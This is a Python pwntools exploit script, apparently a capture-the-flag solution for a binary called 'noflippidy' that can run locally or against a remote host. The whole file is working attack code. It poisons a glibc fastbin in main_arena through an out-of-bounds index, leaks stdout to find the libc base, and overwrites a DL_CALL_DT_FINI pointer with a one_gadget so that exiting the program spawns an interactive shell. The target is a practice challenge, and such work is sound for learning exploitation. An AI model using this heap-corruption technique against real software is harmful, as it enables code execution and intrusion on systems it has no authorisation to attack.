#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "noflippidy.hackable.software"
PORT = 1337
PROCESS = "./noflippidy"

def add(idx, data):
	r.sendline("1")
	r.sendlineafter(": ", str(idx))
	r.sendlineafter(": ", data)
	LEAK = r.recvuntil(": ")
	return LEAK

def flip():
	r.sendline("2")
	r.recvuntil(": ")

def exploit(r):
	log.info("Create notebook in mmapped region before libc")
	r.sendlineafter(": ", str(0x300200020/8))
	r.recvuntil(": ")
	
	log.info("Overwrite 0x40 freed fastbin in main_arena and point it to bss")
	payload = p64(0x0) + p64(0x41)
	payload += p64(0x404000)

	add((0x5ecc60-0x10)/8, payload)

	add(1, "A")

	log.info("Overwrite menu_ptr with pointer to stdout")
	payload = "A"*0x10
	payload += p64(0x404120)

	LEAK = u64(add(2, payload)[2:2+6].ljust(8, "\x00"))
	libc.address = LEAK - libc.symbols["_IO_2_1_stdout_"]

	log.info("LIBC        : %s" % hex(LEAK))
	log.info("LIBC        : %s" % hex(libc.address))

	log.info("Overwrite DT_CALL_DT_FINI with one_gadget")		
	ONEGADGET = libc.address + 0x4f432

	# DL_CALL_DT_FINI
	payload = "A"*8
	payload += p64(ONEGADGET)			# call 2 (one gadget)
	
	add((0x81c000 + 0x1208) / 8, payload)

	log.info("Exit to trigger _dl_fini")	
	r.sendline("3")
	r.recvline()

	r.interactive()
	
	return

if __name__ == "__main__":
	libc = ELF("./libc.so.6")

	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)		
	else:
		LOCAL = True
		r = process("./noflippidy", env={"LD_PRELOAD":"./libc.so.6"})		
		print (util.proc.pidof(r))
		pause()
	
	exploit(r)